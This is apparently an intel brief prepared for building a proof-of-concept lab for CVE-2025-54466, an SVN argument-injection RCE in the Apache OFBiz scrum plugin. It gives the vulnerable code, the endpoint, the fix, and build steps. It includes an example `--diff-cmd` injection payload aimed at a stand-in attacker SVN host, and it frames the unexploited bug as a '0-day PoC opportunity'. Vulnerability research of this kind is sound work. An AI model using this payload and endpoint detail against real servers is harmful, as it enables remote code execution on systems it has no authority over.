# Intel Brief: CVE-2025-54466

## CVE Overview

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-54466 |
| **Title** | Apache OFBiz Scrum Plugin — Code Injection / RCE |
| **Affected Software** | Apache OFBiz (ofbiz-plugins, scrum component) |
| **Vendor** | Apache Software Foundation |
| **Affected Versions** | All versions before 24.09.02 (when scrum plugin is enabled) |
| **CVSS (NVD)** | 9.8 CRITICAL — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CVSS (GHSA)** | 6.3 MODERATE — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L` |
| **EPSS** | 0.2% (36.2th percentile) |
| **CWE** | CWE-94 (Improper Control of Generation of Code — Code Injection) |
| **Published** | 2025-08-15 |
| **GHSA** | GHSA-7vg9-49f9-pfxr |

## Vulnerability Description

The Apache OFBiz scrum plugin's `ScrumServices.viewScrumRevision()` method constructs SVN shell commands by **directly concatenating user-controlled `revision` and `repository` parameters** into command strings that are passed to `Runtime.getRuntime().exec()`.

Java's `Runtime.exec(String)` tokenizes the command string by whitespace (using `StringTokenizer`) — it does **NOT** invoke a shell. This means traditional shell metacharacter injection (`; | && $()`) does not work. However, it enables **SVN argument injection**: an attacker can inject additional SVN command-line flags through the `repository` parameter. Specifically, SVN's `--diff-cmd` flag allows specifying an **arbitrary external program** to execute as the diff tool, leading to Remote Code Execution (RCE).

A second method, `retrieveMissingScrumRevision()`, has an identical vulnerability via the `repositoryRoot` parameter.

The CVE advisory states: *"Even unauthenticated attackers can exploit this vulnerability."*

## Repository Information

| Field | Value |
|---|---|
| **Plugins Repository** | `https://github.com/apache/ofbiz-plugins.git` |
| **Framework Repository** | `https://github.com/apache/ofbiz-framework.git` |
| **Vulnerable Version Tag** | `release24.09.01` |
| **Patched Version Tag** | `release24.09.02` |
| **Fix Commit (release24.09 branch)** | `ae0c279b9c7bb91a36d038f2dab5941b09b1de09` |
| **Fix Commit (trunk)** | `5a35b4f84f1314eed6bcdaca287e98a79b6ab1dd` |
| **Fix Author** | Nicolas Malin |
| **Fix Date** | 2025-07-26 |

## Vulnerable Code Analysis

### Primary Vulnerable Method: `viewScrumRevision()`

**File:** `scrum/src/main/java/org/apache/ofbiz/scrum/ScrumServices.java` (lines 132-166)

```java
public static Map<String, Object> viewScrumRevision(DispatchContext ctx, Map<String, ? extends Object> context) {
    String revision = (String) context.get("revision");
    String repository = (String) context.get("repository");
    // ...
    if (UtilValidate.isNotEmpty(repository) && UtilValidate.isNotEmpty(revision)) {
        // VULNERABLE: User-controlled 'revision' and 'repository' concatenated into command
        String logCommand = "svn log -r" + revision + " " + repository;
        Process logProcess = Runtime.getRuntime().exec(logCommand);
        // ...
        String diffCommand = "svn diff -r" + Integer.toString((Integer.parseInt(revision.trim()) - 1))
            + ":" + revision + " " + repository;
        Process diffProcess = Runtime.getRuntime().exec(diffCommand);
    }
    // ...
}
```

### Injection Analysis

1. **`revision` parameter**: Must parse as an integer (`Integer.parseInt(revision.trim())` on line 150), limiting injection through this parameter.
2. **`repository` parameter**: A free-form String with NO validation. After tokenization by whitespace, injected tokens become additional arguments to the `svn` command.

### Attack Scenario (via `svn diff --diff-cmd`)

When `repository` = `--diff-cmd=/usr/bin/touch http://attacker-svn/repo`:

The `diffCommand` becomes:
```
svn diff -r6:7 --diff-cmd=/usr/bin/touch http://attacker-svn/repo
```

After `Runtime.exec()` tokenization by whitespace:
```
["svn", "diff", "-r6:7", "--diff-cmd=/usr/bin/touch", "http://attacker-svn/repo"]
```

SVN will execute `/usr/bin/touch` as the external diff program when it encounters differences. For full RCE, the attacker could point `--diff-cmd` to an attacker-controlled script or use other SVN flags for configuration manipulation.

### Secondary Vulnerable Method: `retrieveMissingScrumRevision()`

**Same file, lines 176-257.** Identical pattern with `repositoryRoot` parameter:
```java
String logCommand = "svn log -r" + i + " " + repositoryRoot;
Process logProcess = Runtime.getRuntime().exec(logCommand);
```

## Access Path / Attack Surface

### Service Definition
**File:** `scrum/servicedef/services.xml` (lines 263-270)
```xml
<service name="viewScrumRevision" engine="java" auth="true"
    location="org.apache.ofbiz.scrum.ScrumServices" invoke="viewScrumRevision">
    <attribute name="revision" type="String" mode="INOUT" optional="false"/>
    <attribute name="repository" type="String" mode="INOUT" optional="false"/>
    <attribute name="logMessage" type="String" mode="OUT" optional="true"/>
    <attribute name="diffMessage" type="String" mode="OUT" optional="true"/>
</service>
```

### HTTP Endpoint
**Controller:** `scrum/webapp/scrum/WEB-INF/controller.xml` (lines 454-457)
```xml
<request-map uri="RevisionInfo">
    <security https="true" auth="true"/>
    <response name="success" type="view" value="RevisionInfo"/>
</request-map>
```

**Screen:** `scrum/widget/TaskScreens.xml` (lines 181-197)
```xml
<screen name="RevisionInfo">
    <section>
        <actions>
            <service service-name="viewScrumRevision" result-map="result">
                <field-map field-name="revision" from-field="parameters.revision"/>
                <field-map field-name="repository" from-field="parameters.repository"/>
            </service>
        </actions>
        <!-- ... renders Revision.ftl template -->
    </section>
</screen>
```

### Unauthenticated Access
Both the service definition (`auth="true"`) and the controller request-map (`auth="true"`) declare authentication as required. However, the CVE explicitly states unauthenticated exploitation is possible. Possible mechanisms:

1. **Service does not validate `userLogin`**: The `viewScrumRevision()` method never retrieves or checks the `userLogin` parameter from the context — it operates solely on `revision` and `repository`.
2. **OFBiz XML-RPC/SOAP endpoints**: OFBiz exposes services via `/webtools/control/xmlrpc` and `/webtools/control/SOAPService`, which have had authentication bypass vulnerabilities in prior CVEs.
3. **Screen rendering bypass**: The `RevisionInfo` screen has no decorator or permission checks of its own — it relies entirely on the controller's auth flag, which may be bypassable through certain OFBiz request handling paths.
4. **Direct HTTP**: Endpoint URL pattern is `/scrum/control/RevisionInfo?repository=PAYLOAD&revision=7`

**Note for PoC builder:** The exact unauthenticated access mechanism needs investigation. The GHSA advisory assigns `UI:R` (User Interaction Required) suggesting the attack may require an authenticated user to click a crafted link. The NVD assigns `UI:N` (No User Interaction). Test both authenticated and unauthenticated invocation paths.

## Fix Analysis

The fix (commit `ae0c279b`) applies three mitigations:

### 1. Array-based Command Execution
Changed from string-based to array-based `Runtime.exec()`:
```java
// BEFORE (vulnerable):
String logCommand = "svn log -r" + revision + " " + repository;
Process logProcess = Runtime.getRuntime().exec(logCommand);

// AFTER (fixed):
Process logProcess = Runtime.getRuntime().exec("svn",
    new String[]{"log", "-r", revision, repository});
```

### 2. Input Validation
Added URL and integer validation:
```java
// BEFORE:
if (UtilValidate.isNotEmpty(repository) && UtilValidate.isNotEmpty(revision)) {

// AFTER:
if (UtilValidate.isNotEmpty(repository) && UtilValidate.isNotEmpty(revision)
    && UtilValidate.isValidUrl(repository) && UtilValidate.isInteger(revision)) {
```

### 3. Test Case
Added `testViewScrumRevisionBadCall` test that verifies injection payloads (e.g., `--diff+--diff-cmd=/bin/ls`) are rejected and produce empty results.

## Build System & Lab Setup

### Build System
- **Build Tool:** Gradle (managed by the framework project)
- **Language:** Java 17 (Eclipse Temurin)
- **Plugin Languages:** Java (43%), FreeMarker (35.3%), Groovy (12.7%)
- **Architecture:** The `ofbiz-plugins` repo is placed inside the framework's `plugins/` directory

### Build Process
```bash
# 1. Clone framework at matching release tag
git clone --branch release24.09.01 https://github.com/apache/ofbiz-framework.git ofbiz-framework

# 2. Clone plugins into the framework's plugins directory
cd ofbiz-framework
git clone --branch release24.09.01 https://github.com/apache/ofbiz-plugins.git plugins

# 3. Build and load demo data
./gradlew cleanAll loadAll

# 4. Start OFBiz
./gradlew ofbiz
```

### Docker Setup
- **Pre-built image:** `ghcr.io/apache/ofbiz:release24.09-plugins-snapshot` (but contains FIXED version — NOT suitable for vulnerable lab)
- **Ports:** 8443 (HTTPS), 8009 (AJP), 5005 (debug)
- **Default credentials (demo data):** admin / ofbiz
- **Framework Dockerfile available** at `https://github.com/apache/ofbiz-framework/blob/release24.09/Dockerfile`
- **Base image:** Eclipse Temurin 17
- **Entrypoint:** `/ofbiz/docker-entrypoint.sh` -> `bin/ofbiz`
- **Environment variables:** `OFBIZ_DATA_LOAD=demo` loads demo data with admin user

### Lab Build Strategy
Since the pre-built Docker image contains the patched version, the lab must be built from source:

**Option A (Recommended):** Build from source at vulnerable tag
1. Clone `ofbiz-framework` at `release24.09.01`
2. Clone `ofbiz-plugins` at `release24.09.01` into `plugins/`
3. Build using Gradle in a Dockerfile
4. Install `svn` client in the container (needed for the vulnerable code to actually execute commands)

**Option B:** Use pre-built image and revert the fix
1. Pull `ghcr.io/apache/ofbiz:release24.09-plugins-snapshot`
2. Replace the compiled ScrumServices.class with the vulnerable version
3. More fragile, not recommended

### Key Dependencies for Lab
- Java 17 (Eclipse Temurin JDK for build, JRE for runtime)
- Gradle (wrapper included in framework repo)
- `svn` client (Subversion) — needed for the vulnerable code path to execute OS commands
- `xsltproc` — needed by the Docker entrypoint for configuration

### OFBiz Component Configuration
The scrum plugin is registered in `scrum/ofbiz-component.xml`:
- **Mount point:** `/scrum` (base-permission: `SCRUM`)
- **Demo webapp:** `/scrumdemo` (base-permission: empty — no permission required)
- **Demo data:** `data/scrumDemoData.xml` (loaded with `demo` reader)

## Public Exploits

**No public exploits found** in ExploitDB, Metasploit, GitHub, or other tracked sources.

This is a **0-day PoC opportunity** — no existing public exploit code exists.

## References

| Type | URL |
|---|---|
| JIRA Issue | https://issues.apache.org/jira/browse/OFBIZ-13276 |
| GHSA Advisory | https://github.com/advisories/GHSA-7vg9-49f9-pfxr |
| Mailing List | https://lists.apache.org/thread/14d0yd9co9gx2mctd3vyz1cc8d39n915 |
| Release Notes | https://ofbiz.apache.org/release-notes-24.09.02.html |
| Security Page | https://ofbiz.apache.org/security.html |
| Download Page | https://ofbiz.apache.org/download.html |
| oss-security | http://www.openwall.com/lists/oss-security/2025/08/05/1 |
| Fix Commit (release) | https://github.com/apache/ofbiz-plugins/commit/ae0c279b9c7bb91a36d038f2dab5941b09b1de09 |
| Fix Commit (trunk) | https://github.com/apache/ofbiz-plugins/commit/5a35b4f84f1314eed6bcdaca287e98a79b6ab1dd |

